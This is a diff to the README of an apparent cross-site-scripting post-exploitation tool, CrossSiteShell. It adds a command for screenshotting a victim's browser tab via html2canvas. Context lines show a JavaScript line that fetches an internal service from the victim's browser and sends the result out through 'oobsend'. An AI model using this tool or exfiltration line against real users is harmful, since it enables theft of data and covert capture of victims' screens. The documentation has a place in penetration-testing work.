@@ -21,4 +21,8 @@ By default, the commands are executed through the eval function which is not asy
 fetch('https://internalservice/api').then(x => x.text().then(oobsend))
 ```
 
+### Taking screenshots
+By using the `.ss` command in the console, CrossSiteShell will attempt to take a screenshot of the victims tab. This is achieved by importing another library (html2canvas) that converts the HTML/CSS into a canvas and saves it's content as an image. The image should be saved to your disk after it gets received.
+
+### HTTPS
 HTTPS is not supported by default. I'd recommend using a reverse proxy such as nginx to redirect traffic to the script.
